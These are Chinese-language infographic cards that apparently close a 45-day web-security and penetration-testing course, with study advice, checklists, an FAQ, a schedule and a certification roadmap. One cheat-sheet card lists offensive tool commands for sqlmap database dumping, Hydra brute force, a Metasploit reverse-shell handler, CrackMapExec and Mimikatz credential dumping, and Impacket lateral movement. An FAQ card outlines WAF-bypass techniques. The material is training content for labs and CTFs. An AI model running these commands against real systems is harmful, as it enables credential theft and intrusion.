  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">② 每天至少2小时靶场实操 + 1小时看书/文章: 理论+实战 双轮驱动 缺一不可 ✓</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">③ 遇到报错别跳过: Google/百度报错信息 80%的坑都能解决 剩下20% 记在笔记本里未来就懂了 ✓</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">④ 写博客/做笔记 是最好的学习: 45天结束后 你应该有45篇详细的靶场WriteUp 发在CSDN/知乎 未来面试就是你的作品集 ✓</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑤ 保持热爱保持好奇心: 安全圈每天都有新CVE新玩法 追不上没关系 打好基础 万变不离其宗 未来的你一定会感谢现在努力45天的自己 💯</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gi28tr1hn" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gi28tr1hn)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#be123c" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🏅 毕业颁发：靶场通关证书 虚拟章</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">🎓 学员ID: CISP-STUDENT-418354 📅 毕业日期: 2026/6/29</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">📚 累计课时: 45天 × 平均每日3~6小时 = 135~270小时实战训练</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">🎯 通关靶场: DVWA 14模块全通 + SQLi-Labs 75关全通 + Upload-Labs 21关 + Pikachu全通 + Vulhub 20+靶机 + Java三大件/Weblogic等中高级漏洞</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">🏆 获得技能徽章: [Web入门银章] [SQL注入金章] [Java漏洞银章] [综合实战铜章] [内网渗透铜章]</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">🧭 最终评级: 【Web安全中级工程师】具备独立进行渗透测试项目/CTF比赛Web题解题/蓝队基础分析的能力</text>
</svg>

<svg width="800" height="382" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 382">
  <defs><linearGradient id="gygluhhe7" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="382" rx="12" fill="url(#gygluhhe7)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0f172a" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧭 3个月后复盘自查表 你要对照检验</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">[ ] CTF比赛独立解题 ≥100 Web题</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">[ ] 发表靶场WriteUp ≥45篇 每篇不少于1000字+截图</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">[ ] Vulhub 通打 ≥60个漏洞 独立复现 不看官方WP</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">[ ] 拿到 CNVD/CNNVD 通用漏洞证书 ≥3个 0到1突破</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">[ ] 开始学习 Pwn 或 Crypto 至少一门非Web方向</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">[ ] 掌握至少一门编程语言 Python/Go/Java 能写简单工具脚本</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">[ ] 能讲清楚 至少10个CVE的成因/复现/修复 面试无压力</text>
  <rect x="300" y="236" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">[ ] 进入 1~2 个高质量安全社群 和大佬交流 不再孤军奋战</text>
  <rect x="540" y="236" width="220" height="55" rx="10" fill="#faf5ff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">[ ] 简历里有 至少1个 安全项目经验 可以写进去面试</text>
  <rect x="60" y="309" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="341.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">[ ] 坚持每天做 当日复盘笔记 今日学3点/踩2坑/明日计划1</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="guzthygas" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#guzthygas)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#1e40af" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🎉 毕业寄语: 安全之路 永无止境</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">当你看到这一页 说明你已经完成了 45天 从零基础到Web安全中级 超酷的旅程 🎉</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">但这只是开始: 今天的CVE-2021-44228 明天就会变成 2025-XXXX 永远有新的漏洞等着你去发现</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">请记住: 学习安全最大的收获 不是拿到了多少证书 而是掌握了【发现问题→分析问题→解决问题】的底层思维能力</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">有了这种能力 无论你未来去做红队/蓝队/安全研究/云安全/AI安全 都能快速上手 一通百通</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">最后 愿你在网络安全的世界里 保持初心 保持热爱 合法合规 做白帽 守护这个真实又虚拟的世界 ❤️</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">👉 我们在 护网红队 / CTF领奖台 / CNVD漏洞榜 / 大厂安全岗 等你 再见！🎉🎉🎉</text>
</svg>

<svg width="800" height="382" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 382">
  <defs><linearGradient id="gp2ap8gex" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="382" rx="12" fill="url(#gp2ap8gex)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0369a1" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">📋 下一步立即执行清单 10件事</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">① 立刻打开BUUCTF 注册账号 刷 2021-WEB方向的题 巩固所学 ✓</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">② 新建 个人博客/CSDN/知乎 开第一篇文章: 《Web安全45天学习总结》 ✓</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">③ 把你的靶场笔记整理成 GitBook 发布在 Github Pages 作为长期作品集 ✓</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">④ 关注 FreeBuf/安全客/先知社区 三个公众号 每天浏览10分钟 保持资讯敏感度 ✓</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑤ CISP证书报名 最近的一期班 尽早拿下入行敲门砖 ✓</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑥ 用 Python 写一个 自己的漏洞扫描器 结合Nuclei模板 调用API 练手自动化 ✓</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑦ 复盘第31/40/41/42/43章的 Java漏洞 每个至少再打2遍 滚瓜烂熟 ✓</text>
  <rect x="300" y="236" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑧ 内网篇 MS17-010 / Zerologon / Mimikatz 实操一遍 可以用靶场本地搭 ✓</text>
  <rect x="540" y="236" width="220" height="55" rx="10" fill="#faf5ff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑨ 加一个安全社群 找到3个同频学习的朋友 组学习小组 互相监督 ✓</text>
  <rect x="60" y="309" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="341.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑩ 3个月后 回到 Day45 再次填写 复盘自查表 检验自己的成长 ✓ 加油！💪</text>
</svg>

<svg width="800" height="163" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 163">
  <defs><linearGradient id="gbqggd5dc" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="163" rx="12" fill="url(#gbqggd5dc)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#92400e" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🎯 三大高频问题解答 FAQ</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Q1: 我零基础 看完还不会写EXP怎么办？A: 很正常！先把每个EXP拿来 逐行加注释 理解每一行是干嘛的 → 然后改参数改payload → 最后自己手搓一个 从复制粘贴到原创 有3个月过渡期</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Q2: 我能找到漏洞 但不会绕过WAF怎么办？A: 绕过WAF本质就是: 编码变形(URL×2/Unicode/Hex) + 拆分拼接(字符串) + 利用协议特性(HTTP2/0.9) + 特征碎片化 多练100个绕过案例就有感觉了</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Q3: 入行安全 工资低怎么办？A: 安全是越老越吃香的行业 前2年先攒经验(证书+项目+漏洞榜) 3年跳大厂 25W+很正常 5年红队/研究员 40W起步 坚持3年 回报比开发高很多！</text>
</svg>

<svg width="800" height="382" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 382">
  <defs><linearGradient id="ggwrsdmtz" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="382" rx="12" fill="url(#ggwrsdmtz)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#7c3aed" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">📖 常用工具 cheat sheet 速查卡</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Nmap: nmap -sT -sV -Pn -T3 -p- -oA target 目标IP 全端口 服务识别 ✓</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Sqlmap: sqlmap -u "url?id=1" --dbs --batch --random-agent 自动脱库 ✓</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">BurpSuite: Intruder 暴力破解 / Repeater 调包 / Scanner 扫描 ✓</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">MSFconsole: use exploit/multi/handler → set payload linux/x86/meterpreter/reverse_tcp → run ✓</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Nuclei: nuclei -u https://target -t /nuclei-templates/cves/ -severity critical,high 批量高危 ✓</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Hydra: hydra -l admin -P pass.txt ssh://target:22 SSH/FTP/HTTP 暴力破解 ✓</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">FRP: frps.ini vps + frpc.ini 靶机 → 配置端口映射 穿透内网 ✓</text>
  <rect x="300" y="236" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CrackMapExec: cme smb 192.168.1.0/24 -u user -p "P@ss" --sam C段批量抓Hash ✓</text>
  <rect x="540" y="236" width="220" height="55" rx="10" fill="#faf5ff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Mimikatz: privilege::debug sekurlsa::logonpasswords lsadump::sam 抓密码 ✓</text>
  <rect x="60" y="309" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="341.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Impacket: psexec.py/wmiexec.py/smbexec.py / secretsdump.py 内网横向全家桶 ✓</text>
</svg>

<svg width="800" height="309" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 309">
  <defs><linearGradient id="gbym4xv4o" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="309" rx="12" fill="url(#gbym4xv4o)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#166534" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">✅ Day45 终极毕业自测 通关就是胜利！</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">🧱 基础: 能讲清 OWASP Top10 每个类别的原理/例子/修复 ≥80分 ✓</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">💉 注入: SQL注入10种类型 手工+sqlmap 75关全部能独立复现 ≥90分 ✓</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">🔒 认证: 弱口令/JWT/会话/Cookie/CSRF 五种认证漏洞原理+实战 ≥85分 ✓</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">☕ Java: Fastjson/Shiro/Log4j2/Weblogic 四大Java高危 能讲清版本差异和加固 ≥90分 ✓</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">🧱 中间件: Nginx/Apache/Tomcat/IIS/JBoss 五种中间件 每个至少说2个CVE ≥80分 ✓</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">🛰️ 综合: Vulhub靶场 从信息收集→漏洞→提权→横向 独立完成 ≥85分 ✓</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">📝 报告: 写过完整的7章节渗透测试报告 包含复现截图和修复建议 ≥80分 ✓</text>
  <rect x="300" y="236" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">🏆 最终平均分: ≥85分 你已经是 Web安全中级工程师 毕业！🎓🎉 低于85分 → 回Day1重刷第二遍 打好基础再冲下阶段 💪</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g7cn62zda" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g7cn62zda)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#166534" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">📅 每日3小时 学习打卡模板</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⏰ 09:00-10:00 理论：阅读漏洞原理/技术文章1篇</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">🧪 10:00-12:00 靶场：2个漏洞 手工+工具 复现</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">📝 12:00-12:30 复盘：写今日所学3点 + 所踩2坑</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">☕ 14:00-16:00 进阶：CTF题1道 / EXP脚本开发 / 工具使用</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">🔬 16:00-17:00 资讯：FreeBuf/先知 浏览最新技术动态</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">🧠 21:00-21:30 睡前回顾：Anki闪卡 复习本日知识点</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g6wfnrhtq" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g6wfnrhtq)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#be123c" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🎯 安全行业证书备考时间轴</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">第1~3月: CISP 准备 → 国内企业准入门槛（必拿）</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">第4~6月: eJPT / Security+ → 入门国际证书 第一份</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">第7~12月: CEH / OSCP 备考 → 报名前靶场100台</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">第13~18月: OSCP 24小时打靶 纯手工 → 目标一次性通过</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">第19~24月: CISSP / CRTP / OSWE → 选对应发展方向</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">持续: CVE / CNVD 证书 → 实战能力证明 加分项</text>
</svg>
